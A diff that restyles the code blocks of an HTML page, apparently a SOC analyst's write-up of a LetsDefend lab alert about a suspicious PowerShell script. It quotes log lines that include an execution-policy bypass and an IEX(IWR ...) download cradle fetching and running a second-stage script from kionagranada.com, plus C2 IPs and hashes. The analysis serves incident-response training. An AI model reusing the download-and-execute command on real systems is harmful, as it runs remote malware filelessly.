@@ -1005,8 +1005,8 @@
   </tbody>
 </table>
 <p>The alert fired at <code>2024-03-14 17:23</code> on host <code>Tony</code> with IP <code>172.16.17.206</code>. The triggered rule was <strong>SOC153 — Suspicious PowerShell Script Executed</strong>, classified as Malware / Medium severity. The file involved was <code>payload_1.ps1</code> located at:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="ln">1</span><span class="cl">C:\Users\LetsDefend\Downloads\payload_1.ps1
-</span></span><span class="line"><span class="ln">2</span><span class="cl">SHA256: db8be06ba6d2d3595dd0c86654a48cfc4c0c5408fdd3f4e1eaf342ac7a2479d0</span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>C:\Users\LetsDefend\Downloads\payload_1.ps1
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>SHA256: db8be06ba6d2d3595dd0c86654a48cfc4c0c5408fdd3f4e1eaf342ac7a2479d0</span></span></code></pre></div></div>
 <p>The AV/EDR reported the file as <strong>Detected</strong> but did not block execution.</p>
 
 <h3 class="relative group"><span style="color:lightblue">Initial Download</span>
@@ -1019,19 +1019,19 @@
     
 </h3>
 <p>Proxy logs confirmed that user <code>LetsDefend</code> on the same host downloaded the file via Chrome at <code>2024-03-14 17:22:25</code> from an Amazon S3 bucket:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="ln">1</span><span class="cl">Source IP:        172.16.17.206:22456
-</span></span><span class="line"><span class="ln">2</span><span class="cl">Destination IP:   3.5.130.147:443
-</span></span><span class="line"><span class="ln">3</span><span class="cl">URL:              https://files-ld.s3.us-east-2.amazonaws.com/payload_1.ps1
-</span></span><span class="line"><span class="ln">4</span><span class="cl">Process:          chrome.exe
-</span></span><span class="line"><span class="ln">5</span><span class="cl">Device Action:    Allowed</span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>Source IP:        172.16.17.206:22456
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>Destination IP:   3.5.130.147:443
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>URL:              https://files-ld.s3.us-east-2.amazonaws.com/payload_1.ps1
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>Process:          chrome.exe
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span>Device Action:    Allowed</span></span></code></pre></div></div>
 <p>Approximately 60 seconds later, Sysmon Event ID 1 (Process Create) recorded PowerShell launching the script with an explicit execution policy bypass:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="ln">1</span><span class="cl">EventID:     1
-</span></span><span class="line"><span class="ln">2</span><span class="cl">Image:       C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
-</span></span><span class="line"><span class="ln">3</span><span class="cl">CommandLine: &#34;powershell.exe&#34; &#34;-Command&#34; &#34;if((Get-ExecutionPolicy) -ne &#39;AllSigned&#39;)
-</span></span><span class="line"><span class="ln">4</span><span class="cl">             { Set-ExecutionPolicy -Scope Process Bypass };
-</span></span><span class="line"><span class="ln">5</span><span class="cl">             &amp; &#39;C:\Users\LetsDefend\Downloads\payload_1.ps1\payload_1.ps1&#39;&#34;
-</span></span><span class="line"><span class="ln">6</span><span class="cl">Hash:        db8be06ba6d2d3595dd0c86654a48cfc4c0c5408fdd3f4e1eaf342ac7a2479d0
-</span></span><span class="line"><span class="ln">7</span><span class="cl">PID:         4315</span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>EventID:     1
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>Image:       C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>CommandLine: &#34;powershell.exe&#34; &#34;-Command&#34; &#34;if((Get-ExecutionPolicy) -ne &#39;AllSigned&#39;)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>             { Set-ExecutionPolicy -Scope Process Bypass };
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span>             &amp; &#39;C:\Users\LetsDefend\Downloads\payload_1.ps1\payload_1.ps1&#39;&#34;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6</span><span>Hash:        db8be06ba6d2d3595dd0c86654a48cfc4c0c5408fdd3f4e1eaf342ac7a2479d0
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7</span><span>PID:         4315</span></span></code></pre></div></div>
 
 <h3 class="relative group"><span style="color:lightblue">payload_1.ps1</span>
     <div id="payload_1ps1" class="anchor"></div>
@@ -1074,18 +1074,18 @@
     
 </h3>
 <p>Sysmon Event ID 4104 (Script Block Logging) captured the payload&rsquo;s in-memory command at <code>2024-03-14 17:23</code>:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="ln">1</span><span class="cl"><span class="n">EventID</span><span class="err">:</span> <span class="mf">4104</span>
-</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="n">Script</span> <span class="n">Block</span> <span class="n">Text</span><span class="err">:</span> <span class="s2">&#34;C:\Windows\system32\cmd.exe&#34;</span> <span class="p">/</span><span class="n">c</span> <span class="s2">&#34;powershell -command
-</span></span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="s2">  IEX(IWR -UseBasicParsing &#39;https://kionagranada.com/upload/sd2.ps1&#39;)&#34;</span>
-</span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="n">Username</span><span class="err">:</span>   <span class="n">LetsDefend</span>
-</span></span><span class="line"><span class="ln">5</span><span class="cl"><span class="n">ProcessId</span><span class="err">:</span>  <span class="mf">6968</span></span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>EventID<span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#ae81ff">4104</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>Script Block Text<span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#e6db74">&#34;C:\Windows\system32\cmd.exe&#34;</span> /c <span style="color:#e6db74">&#34;powershell -command
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span><span style="color:#e6db74">  IEX(IWR -UseBasicParsing &#39;https://kionagranada.com/upload/sd2.ps1&#39;)&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>Username<span style="color:#960050;background-color:#1e0010">:</span>   LetsDefend
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span>ProcessId<span style="color:#960050;background-color:#1e0010">:</span>  <span style="color:#ae81ff">6968</span></span></span></code></pre></div></div>
 <p><code>payload_1.ps1</code> used <code>Invoke-WebRequest</code> to download <code>sd2.ps1</code> from <code>kionagranada.com</code> and immediately executed it in memory via <code>Invoke-Expression</code> — a fileless execution technique that leaves no file artifact on disk.</p>
 <p>A Sysmon Event ID 22 (DNS Query) confirmed the resolution:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="ln">1</span><span class="cl">EventID:     22
-</span></span><span class="line"><span class="ln">2</span><span class="cl">QueryName:   kionagranada.com
-</span></span><span class="line"><span class="ln">3</span><span class="cl">QueryResult: 161.22.46.148
-</span></span><span class="line"><span class="ln">4</span><span class="cl">Process:     powershell.exe
-</span></span><span class="line"><span class="ln">5</span><span class="cl">UtcTime:     2024-03-14 17:23:46</span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>EventID:     22
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>QueryName:   kionagranada.com
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>QueryResult: 161.22.46.148
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>Process:     powershell.exe
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span>UtcTime:     2024-03-14 17:23:46</span></span></code></pre></div></div>
 <p><code>161.22.46.148</code> is the <strong>C2 Stage 1</strong> server hosting the second-stage script. VirusTotal relations for this IP showed a communicating file <code>sd4.ps1</code> (13/62 detections) and numerous ELF and executable files associated with the same infrastructure.</p>
 <p><figure><img
     class="my-0 rounded-md"
